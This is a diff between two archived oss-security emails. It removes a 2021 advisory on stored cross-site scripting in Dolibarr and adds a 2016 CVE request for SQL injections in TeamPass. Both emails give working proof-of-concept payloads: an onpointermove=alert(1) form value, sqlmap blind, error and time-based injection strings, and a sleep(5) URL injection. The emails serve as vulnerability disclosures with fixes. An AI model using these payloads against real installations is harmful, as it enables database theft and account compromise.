@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5650" "Wednesday" "10" "November" "2021" "11:36:13" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" nil "185" "[oss-security] Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM" nil nil nil "11" nil nil (number mark "U       s.pietsch@tr Nov 10  185/5650  " thread-indent "\"[oss-security] Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6398" "Monday" "11" "July" "2016" "11:14:02" "+0800" "das das" "scusec2010@gmail.com" "<CAAjTPb_5q38hwdLzjNP+ejfhLvpNP7ny_tzCGF9diJf1zh1Pxw@mail.gmail.com>" "153" "[oss-security] CVE request:SQL injections in TeamPass" nil nil nil "7" "2016071103:14:02" "[oss-security] CVE request:SQL injections in TeamPass" (number mark "U       scusec2010@g Jul 11  153/6398  " thread-indent "\"[oss-security] CVE request:SQL injections in TeamPass\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 1773 invoked by uid 550); 10 Nov 2021 11:44:16 -0000
+Received: (qmail 13922 invoked by uid 550); 11 Jul 2016 03:24:38 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,207 +12,191 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 30608 invoked from network); 10 Nov 2021 11:36:28 -0000
-Date: Wed, 10 Nov 2021 11:36:13 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
-	s=protonmail; t=1636544176;
-	bh=2aNm6XLCP6HuS+Fs+dsfA0yJmoRVOmERWnxj7KcN8S0=;
-	h=Date:To:From:Reply-To:Subject:From;
-	b=OCX58w9ZQ2qG2CbjdxskQL34igboN/W/NfQQFl5AHPLYazPZb4YMbk5ophU5tM6iM
-	 NtwcMwafdp4m7Q6EKtQkazRcls3zb3PKQJxpV1zI4PQZHNbA9dvUeHoORDh29h+DRk
-	 OAkAJzPuEpNZJGrwT7bdAybKwSXUz0qH4fNemS4WUNNT6Egj4fHE5t2WH6NobjROIu
-	 Cc/Sst7rZFFUFzxzdScPZISO57Oh7EXBTTxqZ4NFmnREjzU9Ow8lYM9ptRtf1MuTwU
-	 8E1PYo/1HoM2hKGZoyGgqhq0yx10ZDiee1WaUgo5Z14/CPGkOQZvg7zRr3raMZE1R/
-	 aeFgVg7W6SvqA==
-To: Packet Storm <submissions@packetstormsecurity.com>, Full Disclosure <fulldisclosure@seclists.org>, oss-security <oss-security@lists.openwall.com>
-From: Stefan Pietsch <s.pietsch@trovent.io>
-Message-ID: <OpF3Ka8B9NOKStlDWy808_uPhKQ3flbllrA6ylRDkyen9W3HMT3I3RgPBSnq7949ZRU5Xld2MRpjSmRJrWVpjBvtfdYpPHLwNRPY9Dm6orU=@trovent.io>
+Received: (qmail 8132 invoked from network); 11 Jul 2016 03:14:15 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:from:date:message-id:subject:to
+         :content-transfer-encoding;
+        bh=u8Bfwo1xn2ndIMtnSJJBZ5qaw4CP7F8S0W3I3jR2e7s=;
+        b=oGA8FCkHoLvNKZPaibQmKiLwfa5TJDpgVRXyq9rhPHn5HLIsS9qprD5w9O2tq2l7gA
+         a+5y3G2eHvYIBhgFmSu/JHv5SqnimgA8zpQkpF1mZ+mt6RqTySOYAJzYI9vnEA9z82IL
+         zSBNT2wmTFSiGczak+wEvG65eXi82pMGDs6WJCJV1QVN62x270OjGLX+3jXeWXBDOstu
+         jQ1dAuUQ8sD6l/ShbCB0RiasDOUZuUaw3XkUXKMGT+qZ3WHPnrrdAexEOKc86VimlE0C
+         UVB6VdN0B3ztmjGzqEVJ1t08q3hM2hpsgDnCaR8yvx2dzgLpsJB5AIQi2Gm4hZuEDLsM
+         VkXw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
+         :content-transfer-encoding;
+        bh=u8Bfwo1xn2ndIMtnSJJBZ5qaw4CP7F8S0W3I3jR2e7s=;
+        b=VQoUJ6Ai5UFb0bz+WYSJg+dq5dQZPhgfTshwJuVEVU81kaKJ+0pZOek5/O1wlm3ebo
+         CxWJle5Zk7qphG7H3+qjC/FoLhHaa9LtvCf79r0BXHLkpUpNF7TLeiuxKWatvMBSRR38
+         O0Lw/WPsW+UknSVjhU4L6PpIM4QRUFduJn8dktYi1WaZO/mfKLHdtaJkE69VjUvb9ABK
+         7TQhTUE21ZnlgpDS5/1mixCHFEEdbodRTmQFEALsmECTWZ+D98sRaaSc0mASJg0QK3wp
+         bJmJgxzPRyR/wlLLRjuQSwteFo6WieMByH0yaEKXDeh2MySC/91g5X2fN8OYgQRnYu7x
+         pWJA==
+X-Gm-Message-State: ALyK8tIdPvkh8ZtOV78BcMCCfBwUqS//UEiHN19jAWPMditLKkhgt/YeCxW3DXcm/7uiGhoqAUakkwLRzNHbmQ==
+X-Received: by 10.157.33.125 with SMTP id l58mr9412742otd.32.1468206843112;
+ Sun, 10 Jul 2016 20:14:03 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="------2ebdfc1ef9307a80fd613682ac145c041eb8bd314b146e4f461f9fb8d1cd7b96"; charset=utf-8
-Subject: [oss-security] Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM
-
---------2ebdfc1ef9307a80fd613682ac145c041eb8bd314b146e4f461f9fb8d1cd7b96
-Content-Type: multipart/mixed;boundary=---------------------fb37858befa9ad6270622381eea4c290
-
------------------------fb37858befa9ad6270622381eea4c290
+From: das das <scusec2010@gmail.com>
+Date: Mon, 11 Jul 2016 11:14:02 +0800
+Message-ID: <CAAjTPb_5q38hwdLzjNP+ejfhLvpNP7ny_tzCGF9diJf1zh1Pxw@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;charset=utf-8
+Subject: [oss-security] CVE request:SQL injections in TeamPass
 
-# Trovent Security Advisory 2105-02 #
-#####################################
+Hello,
 
+I'd like to request CVE IDs for these issues. They were found in
+TeamPass(www.teampass.net).
+All the issues are found in TeamPass (2.1.26, 2.1.25, 2.1.24).
+fixed:https://github.com/nilsteampassnet/TeamPass/commit/7bf6c63c4727a6ba9d=
+65610e59ccbc25527a6fca
 
-Stored cross-site scripting in Dolibarr ERP & CRM
-#################################################
+Issues detail:
+#1: SQL injection vectors in sources/items.queries.php
 
+-------------------------code_start TeamPass-2.1.26-------------------------
+case "send_email":
+            if ($_POST['key'] !=3D $_SESSION['key']) {
+                echo '[{"error" : "something_wrong"}]';
+                break;
+            } else {
+                if (!empty($_POST['content'])) {
+                    $content =3D explode(',', $_POST['content']);
+                }
+                // get links url
+                if (empty($_SESSION['settings']['email_server_url'])) {
+                    $_SESSION['settings']['email_server_url'] =3D
+$_SESSION['settings']['cpassman_url'];
+                }
+                if ($_POST['cat'] =3D=3D "request_access_to_author") {
+                    $dataAuthor =3D DB::queryfirstrow("SELECT
+email,login FROM ".prefix_table("users")." WHERE id=3D ".$content[1]);
+                    $dataItem =3D DB::queryfirstrow("SELECT label FROM
+".prefix_table("items")." WHERE id=3D ".$content[0]);
+                    $ret =3D @sendEmail(
+                        $LANG['email_request_access_subject'],
+                        str_replace(array('#tp_item_author#',
+'#tp_user#', '#tp_item#'), array(" ".addslashes($dataAuthor['login']),
+addslashes($_SESSION['login']), addslashes($dataItem['label'])),
+$LANG['email_request_access_mail']),
+                        $dataAuthor['email']
+                    );
+                } elseif ($_POST['cat'] =3D=3D "share_this_item") {
+                    $dataItem =3D DB::queryfirstrow("SELECT
+label,id_tree FROM ".prefix_table("items")." WHERE id=3D
+".$_POST['id']);
+                    // send email
+                    $ret =3D @sendEmail(
+                        $LANG['email_share_item_subject'],
+                        str_replace(
+                            array('#tp_link#', '#tp_user#', '#tp_item#'),
 
-Overview
-########
+array($_SESSION['settings']['email_server_url'].'/index.php?page=3Ditems&gr=
+oup=3D'.$dataItem['id_tree'].'&id=3D'.$_POST['id'],
+addslashes($_SESSION['login']), addslashes($dataItem['label'])),
+                            $LANG['email_share_item_mail']
+                        ),
+                        $_POST['receipt']
+                    );
+                }
+                echo '[{'.$ret.'}]';
+            }
+            break;
+-------------------------code_end TeamPass-2.1.26--------------------------
 
-Advisory ID: TRSA-2105-02
-Advisory version: 1.0
-Advisory status: Public
-Advisory URL: https://trovent.io/security-advisory-2105-02
-Affected product: Dolibarr ERP & CRM
-Tested versions: Dolibarr 13.0.2
-Vendor: Dolibarr foundation, https://www.dolibarr.org
-Credits: Trovent Security GmbH, Nick Decker
+In the "send_email" request, when the condition "$_POST['cat'] =3D=3D
+"share_this_item"" is successful, the POST parameter "id" is unescaped
+which leads to sql injection. while is checks the sessions at the
+beginning of the script and needs the authority of normal user to
+access to the page. To execute the SQL query,it verifies that if the
+the post parameter'key' equals session['key'].We can get the key
+through thisway=EF=BC=9Arefresh the page(e.g index.php?page=3Ditems), captu=
+re
+the packet using tools (e.g Burp Suit), and forward the packet,then we
+canget the value of session 'key' in the request body.
+e.p
+http://localhost:8088/code_audit/TeamPass/sources/items.queries.php
+POST:
+type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia1laeyi9doh6G&=
+cat=3Dshare_this_item&id=3D1*
+Sqlmap payload:
+sqlmap identified the following injection point(s) with a total of 406
+HTTP(s) requests:
+---
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY
+or GROUP BY clause
+    Payload: type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia=
+1laeyi9doh6G&cat=3Dshare_this_item&id=3D1
+RLIKE (SELECT (CASE WHEN (7565=3D7565) THEN 1 ELSE 0x28 END))
 
+    Type: error-based
+    Title: MySQL >=3D 5.1 AND error-based - WHERE, HAVING, ORDER BY or
+GROUP BY clause (EXTRACTVALUE)
+    Payload: type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia=
+1laeyi9doh6G&cat=3Dshare_this_item&id=3D1
+AND EXTRACTVALUE(4196,CONCAT(0x5c,0x7162766271,(SELECT
+(ELT(4196=3D4196,1))),0x716b706271))
 
-Detailed description
-####################
-
-Trovent Security GmbH discovered that the Dolibarr application does not esc=
-ape
-"greater than" and "smaller than" characters if they are reflected in one o=
-f the
-small pop-up windows with details of the object.
-This allows an attacker to add certain custom HTML tags and attributes.
-In our PoC we used a "body" tag in conjunction with an "onpointermove" attr=
-ibute
-to achieve constant execution of the inserted JavaScript code.
-
-Severity: Critical
-CVSS Score: 9.0 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)
-CWE ID: CWE-79
-CVE ID: CVE-2021-33618
-
-
-Proof of concept
-################
-
-This is the HTTP request to change the group name:
-
-REQUEST:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-
-POST /user/group/card.php HTTP/1.1
-Host: 10.11.9.80
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox=
-/78.0 -securitytest-for-dolibarr
-Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,image/webp,=
-*/*;q=3D0.8
-Accept-Language: en-US,en;q=3D0.5
-Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=3D---------------------------32=
-9097076628264922392755475836
-Content-Length: 950
-Origin: http://10.11.9.80
-Connection: close
-Referer: http://10.11.9.80/user/group/card.php?id=3D1&action=3Dedit&token=
-=3D4726524fe505b027519a535e08c11fb6
-Cookie: PHPSESSID=3D8s2jl8fhmbm5th8r4baasak1q2; DOLSESSID_736206a8219848378=
-77b8a6a901910d2=3D4jkf7smp24evfm3vvnnunj8jaq
-Upgrade-Insecure-Requests: 1
-
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name=3D"token"
-
-6585d0838337cafddc3387fcccbe9d91
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name=3D"action"
-
-update
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name=3D"backtopage"
-
-/user/group/card.php?id=3D1
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name=3D"id"
-
-1
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name=3D"nom"
-
-Trovent<<body onpointermove=3Dalert(1) <>test
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name=3D"note"
-
-
-- -----------------------------329097076628264922392755475836
-Content-Disposition: form-data; name=3D"save"
-
-Save
-- -----------------------------329097076628264922392755475836--
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
+    Type: AND/OR time-based blind
+    Title: MySQL <=3D 5.0.11 AND time-based blind (heavy query)
+    Payload: type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia=
+1laeyi9doh6G&cat=3Dshare_this_item&id=3D1
+AND 7783=3DBENCHMARK(5000000,MD5(0x44794d4a))
+---
 
 
+#2: SQL injection vectors in
+includes/libraries/Database/Meekrodb/db.class.php
 
-CODE:
-
-The HTML code of the site then includes the attribute in its body tag:
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-
-<body id=3D"mainbody" class=3D"sidebar-collapse" <=3D"" onpointermove=3D"al=
-ert(1)" style=3D"margin-bottom: 26px;">
-
-<!-- Start top horizontal -->
-<div class=3D"side-nav-vert"><div id=3D"id-top"><div id=3D"tmenu_tooltip" c=
-lass=3D"tmenu">
-[...]
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
-~~~~~
-
-
-Solution / Workaround
-#####################
-
-To mitigate this vulnerability, we recommend to always escape the user input
-regardless of where it is reflected. Additionally we recommend to blacklist=
- all
-HTML tags and attributes.
-
-Fixed in Dolibarr version 14.0.0, verified by Trovent.
-
-
-History
-#######
-
-2021-05-25: Vulnerability found
-2021-05-28: CVE ID requested & received
-2021-05-31: Vendor contacted
-2021-06-02: Vendor reported the vulnerability as fixed
-2021-11-08: Add information about fixed version
-2021-11-10: Advisory published
-
------------------------fb37858befa9ad6270622381eea4c290--
-
---------2ebdfc1ef9307a80fd613682ac145c041eb8bd314b146e4f461f9fb8d1cd7b96
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
-
------BEGIN PGP SIGNATURE-----
-Version: ProtonMail
-
-wsFzBAEBCAAGBQJhi66WACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
-/h6Fjrc3xw/5AcnUej6WA9xUyIG5Xngt/jSKJeLvXUFj9J5vAyMJtiH5Fn9Z
-99FcK1HROu4/ymHdRxkUV/TGvh/wU/frkxjqbw9v3WM4p7pEvODd+OBwcd3G
-IyMNOM/losfF/S4LfILyWHdzuDLqgEat2rTQC73InE1PvvU8iglDH2PzVfmG
-mAHR5U1l6WU2ccgJjGT8wQGZsO0EyJc394ooKwQIGmdq+6ohDtdTabu22tvU
-oiUK5A45a2hIQEGIrwnWQC41q44NdE3HmIgP5U4uhI+868G+1sXqDyTDlT1F
-SS1UD391Za4ll5tGH7q/NstAYPSRRWAtbwaUIqfkXwij4EabyjUonZcOGFWL
-r7pnCkw7DNOScgnnJUXYrwkiY0IBPIJh/4MHxJRer6Lga+1D0xoV+H79FYte
-0zMo99TtXVQ2jvL1P8Gd4naFrqem8Y65L8Z3DWX2SXEJLopeZ1pS33ylyuHJ
-u2x6f5oiH531BqRjDjlkTOYM469fTr+d1nUhGV1NzdmpD+dccjAU2TZx5BcI
-DYwnPUNs+CoOSfa6laTvLeEjKdKCzWVZKq0wpLj07UhC8Jhv5cptTOXNklql
-AKVN6OwgP0V9/S7cBcYqcp5iKTG2TOgVY3Y/CqtutpG6FqaMbdJKvH/3UM0t
-onjl+Is/vZMuvjWUbgecR8Sy9HuQJV5ePRs=
-=LNvM
------END PGP SIGNATURE-----
+-------------------------code_start TeamPass-2.1.26-------------------------
+// ----- BEGIN ERROR HANDLING
+    if (!$sql || $db->error) {
+      if ($this->error_handler) {
+        $db_error =3D $db->error;
+        $db_errno =3D $db->errno;
+$db->query(
+"INSERT INTO ".$GLOBALS['pre']."log_system SET
+date=3D".time().",
+qui=3D".$_SESSION['user_id'].",
+label=3D'Query: ".addslashes($sql)."<br />Error:
+".addslashes($db_error)."<br />@ ".$_SERVER['REQUEST_URI']."',
+type=3D'error'",
+MYSQLI_USE_RESULT
+);
+-------------------------code_end TeamPass-2.1.26--------------------------
+When a database error occurs, these codes above will be excuted.
+However, the variable "$_SERVER['REQUEST_URI']" is unescaped and
+controled by us which lead to a sql injection. First we need to find a
+place where database error occurs, such as
+"sources/import.queries.php". It needs a normal user authority to
+access to the page. Then use the burpsuit to access the page to avoid
+the urlencode by browsers.
+e.p
+http://localhost:8088/TeamPass/sources/import.queries.php?'or/**/sleep(5)/*=
+*/or'1
+POST:
+type=3Dimport_items&data=3D&folder=3D1
+And the sql log is as below. It is a time-based sql injection.
+-------------------------log_start-------------------------
+Query INSERT INTO teampass_log_system SET
+date=3D1466674179,
+qui=3D10000001,
+label=3D'Query: INSERT INTO `teampass_items`
+(`label`,`description`,`pw`,`pw_iv`,`url`,`id_tree`,`login`,`anyone_can_mod=
+ify`)
+VALUES (\'\', NULL, \'\', \'dfd7c5279cdd697c08b627aeaaf15999\', NULL,
+\'1\', NULL, 0)<br />Error: Column \'description\' cannot be null<br
+/>@ /code_audit/TeamPass/sources/import.queries.php?'or/**/sleep(5)/**/or'1=
+',
+type=3D'error'
+-------------------------log_end---------------------------
 
 
---------2ebdfc1ef9307a80fd613682ac145c041eb8bd314b146e4f461f9fb8d1cd7b96--
-
+These issues were discovered by wps2015[D.A.S] of Information Security
+Institute @ Sichuan University.
